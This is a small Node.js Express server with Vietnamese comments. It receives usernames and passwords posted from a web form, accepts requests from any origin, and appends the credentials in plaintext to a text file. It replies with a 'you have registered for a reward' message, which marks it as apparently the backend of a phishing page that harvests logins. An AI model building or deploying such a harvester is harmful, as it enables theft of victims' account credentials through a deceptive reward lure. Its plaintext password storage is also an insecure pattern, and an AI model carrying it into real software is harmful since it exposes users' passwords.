const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');

const app = express();
const port = 3000;

// Cấu hình CORS cho phép tất cả các nguồn
app.use(cors());

// Middleware để đọc dữ liệu từ form (JSON)
app.use(bodyParser.json());

// Định nghĩa route POST để nhận dữ liệu từ form
app.post('/submit', (req, res) => {
    const { username, password } = req.body;

    // Ghi dữ liệu vào file user_data.txt
    fs.appendFile('user_data.txt', `Username: ${username}, Password: ${password}\n`, (err) => {
        if (err) {
            return res.status(500).send('Lỗi khi lưu dữ liệu');
        }
        res.json({ message: 'Bạn đã đăng ký nhận thưởng thành côngcông!' });
    });
});

// Khởi động server
app.listen(port, () => {
    console.log(`Server đang chạy tại http://localhost:${port}`);
});
